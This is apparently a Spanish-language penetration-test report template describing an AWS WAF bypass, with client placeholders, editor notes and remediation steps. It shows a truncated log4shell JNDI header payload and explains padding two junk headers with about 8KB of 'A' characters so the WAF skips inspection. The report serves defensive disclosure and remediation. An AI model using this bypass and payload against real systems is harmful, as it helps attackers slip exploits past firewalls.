### Descripción

AWS WAF (Web Application Firewall) ayuda a proteger las aplicaciones web/APIs de ataques web comunes y bots que pueden afectar la disponibilidad, comprometer la seguridad y consumir recursos excesivos. Es un firewall que permite a los usuarios crear reglas personalizadas para filtrar el tráfico web basado en condiciones específicas, como direcciones IP, encabezados HTTP, cadenas de consultas URI y cuerpos de solicitud. Además, AWS WAF ofrece protecciones predefinidas contra vulnerabilidades comunes, como las inyecciones SQL y el cross-site scripting (XSS), de igual forma proporciona herramientas para gestionar y mitigar automáticamente ataques DDoS a través de su integración con AWS Shield.

Es importante recordar que el uso de un WAF aporta seguridad en un esquema de seguridad basado en capas, sin embargo, es una mala práctica delegarle toda la seguridad a este.

### Componentes Afectados

- https://www.cliente_url.com/modulo1/afectado1?id=1&time=now
    - Parámetro Afectado:  id
- https://www.cliente_url.com/modulo2/afectado2?cat=1&dir=/
    - Parámetro Afectado:  dir

### Detalles

§REDACTAR A DETALLE EL SIGUIENTE TEMPLATE, DEBIDO A QUE YA NO ES VULNERABLE A BYPASS MEDIANTE 8KB, ESTE PRIMER TEMPLATE ES UN BYPASS GENERICO, EL SIGUIENTE ES EL 8KB EN CASO DE DETECTAR UN SERVICIO CON ESTA MALA CONFIGURACION REALIZADA DIRECTAMENTE POR EL CLIENTE O POR SER UNA IMPLEMENTACION ANTIGUA§

El equipo de AppSec de Hackmetrix pudo evadir el firewall de AWS, el cual estaba implementado sobre los servicios HTTP/HTTPS de ###CLIENTE###. Esto fue posible, mediante §REDACTAR§.

A continuación, se evidenciará cómo fue posible evadir la implementación de AWS WAF sobre el dominio ###URL###

Paso 1: Se procedió a enviar una petición §REDACTAR§, el cual es el siguiente:

```
X-Command: xxxxxxxxxx
```

Quedando la petición de la siguiente forma:

*HTTP Request:*

```
POST /graphql HTTP/2
Host: test.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Length: 312
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
Te: trailers
X-Command: ${jndi:ldap:/.....}##body##
```

*HTTP Response:*

```
HTTP/2 403 Forbidden
Server: awselb/2.0
Date: Mon, 05 Dec 2022 14:13:21 GMT
Content-Type: text/html
Content-Length: 118<html>
<head><title>403 Forbidden</title></head>
<body>
<center><h1>403 Forbidden</h1></center>
</body>
</html>
```

**Paso 2:** El equipo de Hackmetrix procedió a §REDACTAR§

Quedando la petición HTTP de la siguiente forma:

*HTTP Request:*

```
POST /graphql HTTP/2
[REDACTED]
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
Te: trailers
X-Junk: AAAA[REDACTED]AAAA
X-Junk2: AAAA[REDACTED]AAAA
X-Command: ${jndi:ldap://....}body
```

Obteniendo como respuesta:

*HTTP Response:*

```
HTTP/2 200 OK
[REDACTED]
```

ERASEME

§REVISAR A DETALLE EL SIGUIENTE TEMPLATE, DEBIDO A QUE YA NO ES VULNERABLE A BYPASS MEDIANTE 8KB§

El equipo de AppSec de Hackmetrix pudo evadir el firewall de AWS, el cual estaba implementado sobre los servicios HTTP/HTTPS de ###CLIENTE###. Esto fue posible, mediante la realización de peticiones más grandes al tamaño máximo soportado por el AWS WAF, en este caso 8kb.

A continuación, se evidenciará cómo fue posible evadir la implementación de AWS WAF sobre el dominio ###URL###

Paso 1: Se procedió a enviar una petición con un payload detectable por el WAF de AWS, en este caso en concreto de la vulnerabilidad comúnmente conocida como log4shell, el cual es el siguiente:

```
X-Command: ${jndi:ldap://........}
```

### obtenerlo de https://log4shell.tools/ ###

Quedando la petición de la siguiente forma:

*HTTP Request:*

```
POST /graphql HTTP/2
Host: test.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Length: 312
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
Te: trailers
X-Command: ${jndi:ldap:/.....}##body##
```

*HTTP Response:*

###Cambiar por la respuesta que les da pero debe ser un forbidden. ###

```
HTTP/2 403 Forbidden
Server: awselb/2.0
Date: Mon, 05 Dec 2022 14:13:21 GMT
Content-Type: text/html
Content-Length: 118<html>
<head><title>403 Forbidden</title></head>
<body>
<center><h1>403 Forbidden</h1></center>
</body>
</html>
```

**Paso 2:** El equipo de Hackmetrix procedió a agregar 2 headers adicionales, en este caso X-Junk, X-Junk2, todos con caracteres “A”, esto con el fin de sumar 8,192 bytes de información, la cual será procesada por el WAF de AWS.

Posterior a estos Headers, se colocó el header con el payload detectado por el WAF de AWS, siendo este, no detectado, ya que el WAF solo analizo los primeros 8kb de información.

####En python: "A"*4096, esos caracteres agregar a X-Junk y X-Junk2 ####

La petición HTTP quedaría de la siguiente forma:

```
HTTP Request:
POST /graphql HTTP/2
[REDACTED]
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
Te: trailers
X-Junk: AAAA[REDACTED]AAAA
X-Junk2: AAAA[REDACTED]AAAA
X-Command: ${jndi:ldap://....}body
```

Obteniendo como respuesta:

*HTTP Response:*

```
HTTP/2 200 OK
[REDACTED]
```

De igual forma, es importante resaltar que el WAF de AWS, solo analiza los primeros 8kb, tanto en los headers, como en las cookies, y el body de las peticiones.

ERASEME

### Impacto

Esto conlleva un riesgo crítico para toda la infraestructura de ###CLIENTE###, ya que un atacante podría realizar diversos ataques evadiendo por medio de este bypass los filtros de defensa impuestos por el WAF de AWS.

### Remediación

El equipo de Hackmetrix recomienda modificar las directivas de protección utilizadas en el WAF de AWS. Con el fin de mitigar dicho bypass.

A continuación se muestra un ejemplo de directiva de bloqueo regional:

**Bloqueo Regional:**

```jsx
{
  "Name": "EXAMPLE",
  "Priority": 0,
  "Action": {
    "Block": {}
  },
  "VisibilityConfig": {
    "SampledRequestsEnabled": true,
    "CloudWatchMetricsEnabled": true,
    "MetricName": "EXAMPLE"
  },
  "Statement": {
    "GeoMatchStatement": {
      "CountryCodes": [
        "US"
      ],
      "ForwardedIPConfig": {
        "HeaderName": "x-forwarded-for",
        "FallbackBehavior": "MATCH"
      }
    }
  }
}
```

**Analisis de mas de 8kb:**

Para esto es necesario configurar una nueva regla dentro del WAF

Pasos a seguir:

1.- Ingresar a la configuración de AWS WAF, y posteriormente dirigirse a Web-ACL

2.-Añadir una nueva regla, dicha regla debera contener los siguientes parametros:

!Untitled

3.- Posteriormente, en la sección “Then”, se debera describir que realizara el WAF cuando se cumplan estas condiciones, la opción “Block”, bloqueara directamente la petición, esta opción es la que se muestra en el ejemplo anterior. Sin embargo si colocamos “Count”, la aplicación evaluara si realmente recibe paquetes de más de 8 KB. En tales casos, el WAF permitirá el paso incluso si tienen más de 8 KB, pero registrará qué páginas recibieron dichas solicitudes más grandes.

Es importante recordar que AWS cuenta con reglas predefinidas para los distintos tipos de escenarios, como se muestra a continuación:

!Untitled

De igual forma, es importante verificar que el acceso a los servidores sea únicamente mediante el waf, y no se permita ningún tipo de conexión directa a las instancias EC2, sin pasar por el WAF y/o el balanceador de cargas.

!Untitled

### Referencias

- AWS Oversize request component handling: https://aws.amazon.com/es/about-aws/whats-new/2024/03/aws-waf-larger-body-inspections-regional-resources/
- Reglas de WAF: https://docs.aws.amazon.com/waf/latest/developerguide/waf-rules.html
- AWS Oversize request component handling: https://docs.aws.amazon.com/waf/latest/developerguide/waf-rule-statement-oversize-handling.html
- Bypassing the AWS WAF protection with an 8KB bullet: https://kloudle.com/blog/the-infamous-8kb-aws-waf-request-body-inspection-limitation

